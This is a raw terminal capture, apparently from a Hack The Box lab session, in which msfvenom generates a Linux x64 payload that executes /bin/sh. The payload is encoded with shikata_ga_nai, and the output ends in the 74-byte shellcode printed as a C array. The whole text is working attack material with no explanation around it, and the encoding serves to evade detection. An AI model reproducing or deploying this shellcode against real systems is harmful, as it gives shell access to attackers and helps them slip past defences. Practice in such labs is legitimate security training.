root@kali:~/htb/sunday# msfvenom -p linux/x64/exec -f c CMD=/bin/sh -e x86/shikata_ga_nai
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 74 (iteration=0)
x86/shikata_ga_nai chosen with final size 74
Payload size: 74 bytes
Final size of c file: 335 bytes
unsigned char buf[] = 
"\xb8\x1e\x03\x75\xae\xda\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x0c\x31\x47\x15\x83\xc7\x04\x03\x47\x11\xe2\xeb\x69\x4e\xf6"
"\x8a\x26\x0b\x29\xce\xdf\x05\x19\x7d\x48\xda\x36\xc9\x01\x3d"
"\xd0\xe4\x72\xc2\x21\xbe\xfd\x24\x73\xd6\xf6\xa8\x74\x26\x28"
"\xcb\x1d\x48\x19\x78\xb6\x94\x33\x29\x0e\x1d\x5d\xda\x8b";

